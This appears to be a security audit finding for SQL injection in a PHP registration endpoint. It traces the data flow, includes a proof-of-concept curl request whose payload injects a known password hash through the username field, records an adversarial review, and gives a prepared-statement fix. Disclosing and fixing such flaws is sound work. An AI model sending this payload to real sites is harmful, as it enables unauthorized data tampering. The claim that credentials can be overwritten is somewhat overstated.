# Vulnerability: SQL Injection — Unauthenticated Register INSERT

## Summary
The `user/register.php` endpoint passes the `username` and `usermail` POST parameters directly into an INSERT query via `sprintf` with `%s` formatting at line 23. Since `%s` performs simple string substitution without escaping, an attacker can inject arbitrary SQL during user registration. No authentication is required.

## Confidence
High

## Authentication Requirement
Unauthenticated

## Attack Surface Location
- **Endpoint:** `POST /user/register.php`
- **Handler:** `user/register.php:1-38`
- **Middleware / Guards:** AumWAF (trivially bypassed)

## Attack Chain
1. **Initial access:** Attacker sends a POST request to `/user/register.php`. No authentication required.
2. **Endpoint interaction:** The register handler reads `post('username')` at line 13 and `post('usermail')` at line 12, then passes both to an INSERT query.
3. **Malicious input:** `username` = `admin', '$2y$10$knownhash', 'attacker@evil.com') -- -` to inject a known password hash for a target user.
4. **Sink execution:** `sprintf("INSERT INTO tbl_users (username, userpass, useremail) VALUES ('%s', '%s', '%s')", $username, pw($p2), $email)` at line 23, then `$mysqli->query($sql)` at line 24.
5. **Post-exploitation:** Attacker registers a user with a crafted username that breaks out of the INSERT and modifies other columns or inserts additional rows.
6. **Final impact:** Data manipulation, potential authentication bypass by overwriting existing user credentials.

## Data Flow
- **Source (user input):** `$_POST['username']`, `$_POST['usermail']`
- **Sink:** `$mysqli->query()` at `user/register.php:24`

```
$_POST['username'] → post('username') [common.php:32-33] → $username [register.php:13] → sprintf("INSERT INTO tbl_users ... VALUES ('%s', '%s', '%s')", $username, pw($p2), $email) [register.php:23] → $mysqli->query($sql) [register.php:24]
```

## Proof of Concept

### Prerequisites
- None. Fully unauthenticated.

### Exploit Request — Inject via Username
```bash
curl -X POST "http://{{TARGET_HOST}}/user/register.php" \
  -d "usermail=legit@email.com&username=admin','$2y$10$knownhash','admin@evil.com')--&p1=pass&p2=pass"
```

### Expected Vulnerable Response
The INSERT succeeds, creating a row with attacker-controlled values. The injected `username` value breaks out of the string context and inserts additional or modified column values.

### Expected Patched Response
After parameterized queries, the injection is treated as literal string data.

### Impact Demonstration
Attacker can insert arbitrary data into the users table, potentially overwriting credentials for existing users or creating admin accounts.

## Affected Code
```php
// user/register.php:12-24
$email = post('usermail');
$username = post('username');
...
$sql = sprintf("INSERT INTO tbl_users (username, userpass, useremail) VALUES ('%s', '%s', '%s')", $username, pw($p2), $email);
$qr = $mysqli->query($sql);
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** `POST /user/register.php` is a public endpoint. Both `username` and `usermail` are read directly from `$_POST`.
- **Impact attack — FAILED to kill.** SQL injection on an INSERT enables data manipulation — attacker can overwrite credentials or inject arbitrary data.
- **Validity attack — FAILED to kill.** `sprintf('%s')` performs plain string substitution — no escaping, no parameterization. The `pw()` function hashes the password but does not affect `username` or `email`.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Use prepared statements:
```php
$stmt = $mysqli->prepare("INSERT INTO tbl_users (username, userpass, useremail) VALUES (?, ?, ?)");
$hashed = pw($p2);
$stmt->bind_param("sss", $username, $hashed, $email);
$stmt->execute();
```